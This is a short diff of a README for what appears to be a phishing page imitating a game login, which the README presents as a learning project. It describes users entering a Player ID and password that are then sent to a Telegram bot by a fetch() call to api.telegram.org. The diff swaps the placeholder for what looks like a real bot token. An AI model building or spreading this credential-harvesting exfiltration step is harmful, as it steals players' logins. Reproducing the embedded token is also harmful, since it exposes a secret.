@@ -29,4 +29,4 @@ The login data is sent to a **Telegram Bot** via the Bot API — perfect to lear
 1. User fills in Player ID and Password
 2. On click, data is sent using:
    ```js
-   fetch(`https://api.telegram.org/botYOUR_TOKEN/sendMessage?...`)
+   fetch(`https://api.telegram.org/7741229374:AAF7RZDHiyUp31GVh5LISuavRzwXGwC8HtQ/sendMessage?...`)
